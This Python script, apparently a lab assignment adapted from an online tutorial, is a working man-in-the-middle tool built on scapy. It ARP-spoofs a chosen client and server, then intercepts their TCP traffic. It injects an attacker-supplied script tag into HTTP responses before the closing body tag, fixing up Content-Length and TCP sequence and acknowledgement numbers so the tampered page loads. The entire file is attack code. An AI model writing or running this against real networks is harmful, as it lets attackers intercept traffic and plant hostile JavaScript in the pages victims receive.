# largely copied from https://0x00sec.org/t/quick-n-dirty-arp-spoofing-in-python/487
from scapy.all import *

import argparse
import os
import re
import sys
import threading
import time

def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", help="network interface to bind to", required=True)
    parser.add_argument("-ip1", "--clientIP", help="IP of the client", required=True)
    parser.add_argument("-ip2", "--serverIP", help="IP of the server", required=True)
    parser.add_argument("-s", "--script", help="script to inject", required=True)
    parser.add_argument("-v", "--verbosity", help="verbosity level (0-2)", default=0, type=int)
    return parser.parse_args()


def debug(s):
    global verbosity
    if verbosity >= 1:
        print('#{0}'.format(s))
        sys.stdout.flush()


# TODO: returns the mac address for an IP
def mac(IP):
    responses,unanswered = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=IP),timeout=2,retry=10)
    return responses.res[0][1].getlayer(ARP).hwsrc


def spoof_thread(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC, interval = 3):
    while True:
        spoof(serverIP, attackerMAC, clientIP, clientMAC) # Spoof client ARP table
        spoof(clientIP, attackerMAC, serverIP, serverMAC) # Spoof server ARP table
        time.sleep(interval)


# TODO: spoof ARP so that dst changes its ARP table entry for src 
def spoof(src_ip, src_mac, dst_ip, dst_mac):
    debug(f"spoofing {dst_ip}'s ARP table: setting {src_ip} to {src_mac}")
    send(ARP(op = 2, pdst = dst_ip, psrc = src_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = src_mac))


# TODO: restore ARP so that dst changes its ARP table entry for src
def restore(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"restoring ARP table for {dstIP}")
    send(ARP(op = 2, pdst = dstIP, psrc = srcIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = srcMAC))
    send(ARP(op = 2, pdst = srcIP, psrc = dstIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = dstMAC))


# TODO: handle intercepted packets
def interceptor(packet):
    global clientMAC, clientIP, serverMAC, serverIP, attackerMAC, script, ID
    response = ""
    if packet.haslayer(TCP) and packet.getlayer(IP).src == clientIP and packet.getlayer(Ether).src == clientMAC:
        print("=============Get & Send============")
        print("-----Get:-----")
        packet.show()
        if packet.getlayer(TCP).flags == 0x002:
            ID[str(packet.getlayer(TCP).sport)] = packet.getlayer(IP).id
        print(ID)
        if len(ID) != 0:
            if packet.getlayer(IP).id == ID[str(packet.getlayer(TCP).sport)]+3 or packet.getlayer(IP).id == ID[str(packet.getlayer(TCP).sport)]+4 or packet.getlayer(IP).id == ID[str(packet.getlayer(TCP).sport)] + 5 or packet.getlayer(IP).id == ID[str(packet.getlayer(TCP).sport)] + 6 or packet.getlayer(IP).id == ID[str(packet.getlayer(TCP).sport)] + 7:
                packet.getlayer(TCP).ack = packet.getlayer(TCP).ack - 47
            del packet.getlayer(IP).chksum
            del packet.getlayer(TCP).chksum              
        send(packet.getlayer(IP))
        print("-----Send:-----")
        (packet.getlayer(IP)).show()
    if packet.haslayer(TCP) and packet.getlayer(IP).src == serverIP and packet.getlayer(Ether).src == serverMAC:
        print("=============Get & Send============")
        print("-----Get:-----")
        packet.show()
        if packet.haslayer(Raw):
            src_addr = packet.getlayer(IP).src
            dst_addr = packet.getlayer(IP).dst
            version = packet.getlayer(IP).version
            ihl = packet.getlayer(IP).ihl
            tos = packet.getlayer(IP).tos
            id_ = packet.getlayer(IP).id
            flags_IP = packet.getlayer(IP).flags
            frag = packet.getlayer(IP).frag
            ttl = packet.getlayer(IP).ttl
            proto = packet.getlayer(IP).proto
            ip = IP(src = src_addr, dst = dst_addr, version = version, ihl = ihl, tos = tos, id = id_, flags = flags_IP, frag = frag, ttl = ttl, proto = proto)
            tail_tag = '</body>'
            content = '<script>' + script + '</script>'
            if packet.getlayer(IP).len == 1500:
                response = packet.getlayer(Raw).load.decode().replace(tail_tag, '<script')
                if re.search(r'Content-Length: (.*)', packet.getlayer(Raw).load.decode()):
                    http_length = int(re.search(r'Content-Length: (.*)', packet.getlayer(Raw).load.decode()).group()[16:])
                    http_length += len('<script>' + script + '</script>')
                    response = response.replace(re.search(r'Content-Length: (.*)', packet.getlayer(Raw).load.decode()).group(),"Content-Length: "+str(http_length)+"\r")
            elif packet.getlayer(Raw).load.decode() == '\n</html>\n':
                response = packet.getlayer(Raw).load.decode().replace('\n</html>\n', '>'+script+'</script></body>\n</html>\n')
            else: 
                response = packet.getlayer(Raw).load.decode().replace(tail_tag, content+tail_tag)
                if re.search(r'Content-Length: (.*)', packet.getlayer(Raw).load.decode()):
                    http_length = int(re.search(r'Content-Length: (.*)', packet.getlayer(Raw).load.decode()).group()[16:])
                    http_length += len('<script>' + script + '</script>')
                    response = response.replace(re.search(r'Content-Length: (.*)', packet.getlayer(Raw).load.decode()).group(),"Content-Length: "+str(http_length)+"\r")
            dst_port = packet.getlayer(TCP).dport
            src_port = packet.getlayer(TCP).sport
            seq = packet.getlayer(TCP).seq
            ack = packet.getlayer(TCP).ack
            dataofs = packet.getlayer(TCP).dataofs
            reserved = packet.getlayer(TCP).reserved
            flags = packet.getlayer(TCP).flags
            window = packet.getlayer(TCP).window
            urgptr = packet.getlayer(TCP).urgptr
            options = packet.getlayer(TCP).options
            tcp = TCP(dport = dst_port, sport = src_port, seq = seq, ack = ack, dataofs = dataofs, flags = flags, window = window, options = options)
            packetnew = ip/tcp/response
            #del packetnew.getlayer(IP).len
            #del packetnew.getlayer(IP).chksum
            #del packetnew.getlayer(TCP).chksum
            print("-----Send:-----")
            packetnew.show2()
            send(packetnew)

        else:
            
            if packet.getlayer(TCP).flags == 0x011:
                packet.getlayer(TCP).seq += 47
                del packet.getlayer(IP).chksum
                del packet.getlayer(TCP).chksum
            
            print("-----Send:-----")
            send(packet.getlayer(IP))
            (packet.getlayer(IP)).show()



if __name__ == "__main__":
    args = parse_arguments()
    verbosity = args.verbosity
    if verbosity < 2:
        conf.verb = 0 # minimize scapy verbosity
    conf.iface = args.interface # set default interface

    clientIP = args.clientIP
    serverIP = args.serverIP
    attackerIP = get_if_addr(args.interface)

    clientMAC = mac(clientIP)
    serverMAC = mac(serverIP)
    attackerMAC = get_if_hwaddr(args.interface)
    
    script = args.script
    ID = {}

    # start a new thread to ARP spoof in a loop
    spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC), daemon=True)
    spoof_th.start()

    # start a new thread to prevent from blocking on sniff, which can delay/prevent KeyboardInterrupt
    sniff_th = threading.Thread(target=sniff, kwargs={'prn':interceptor}, daemon=True)
    sniff_th.start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        restore(clientIP, clientMAC, serverIP, serverMAC)
        restore(serverIP, serverMAC, clientIP, clientMAC)
        sys.exit(1)

    restore(clientIP, clientMAC, serverIP, serverMAC)
    restore(serverIP, serverMAC, clientIP, clientMAC)
